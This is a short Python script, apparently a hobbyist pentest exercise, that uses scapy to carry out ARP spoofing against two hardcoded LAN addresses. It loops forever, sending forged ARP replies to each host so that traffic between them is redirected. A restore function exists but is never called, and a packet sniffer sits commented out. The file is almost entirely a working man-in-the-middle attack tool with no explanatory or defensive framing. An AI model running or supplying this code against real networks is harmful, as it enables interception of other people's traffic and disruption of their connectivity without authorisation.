import scapy.all as scapy
import time

# packet[0][0] MAC address
# packet[0][1] IP address, packet[IP]
# packet[0][2] TCP, UDP. ICMP, packet[TCP], packet[UDP], packet[ICMP]

# def show_packet(packet):
#     src_ip = packet[0][1].src
#     dst_ip = packet[0][1].dst
#     proto = packet[0][1].proto
#
#     if proto in protocols:
#         print(f'protocol/{protocols[proto]}: {src_ip} -> {dst_ip}')
#         if proto == 1:
#             print(f'TYPE: [{packet[0][2].type}], CODE[{packet[0][2].code}]')
#
#
# def sniffing(filter):
#     sniff(filter=filter, prn=show_packet, count=0)
#
#
# if __name__ == '__main__':
#     filter = 'google.com'
#     sniffing(filter)


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False)

protocols = {1: 'ICMP', 6: 'TCP', 17: 'UDP'}





def main():

    target_ip = '192.168.1.78'

    spoof_ip = '192.168.1.79'

    try:
        sent_packets_count = 0
        while True:
            spoof(target_ip, spoof_ip)
            spoof(spoof_ip, target_ip)
            sent_packets_count = sent_packets_count + 2
            print(f'\r[*] Packets sent {str(sent_packets_count)}', end='')
            time.sleep(2)
    except KeyboardInterrupt:
        print('\nCtrl + C pressed.............Exiting')
        exit(0)

main()